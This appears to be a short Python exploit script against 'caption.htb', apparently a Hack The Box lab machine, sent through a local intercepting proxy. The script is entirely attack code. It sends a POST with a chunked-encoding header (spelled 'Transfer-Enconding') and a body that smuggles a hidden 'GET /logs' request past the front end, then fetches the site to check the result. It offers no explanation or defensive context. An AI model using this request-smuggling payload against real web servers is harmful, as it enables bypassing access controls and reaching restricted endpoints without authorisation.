import requests
proxies={"http":"http://localhost:8080"}


r = requests.post("http://caption.htb", data="0\r\n\r\n\r\nGET /logs HTTP/1.1\r\nHost: caption.htb\r\nFoo: x", headers={"Transfer-Enconding": "chunked", "User-Agent":"Mozilla"}, proxies={"http":"http://localhost:8080"})

print(r.text)

r2 = requests.get("http://caption.htb/", proxies=proxies, headers={"User-Agent":"Mozilla"})
print(r2.text)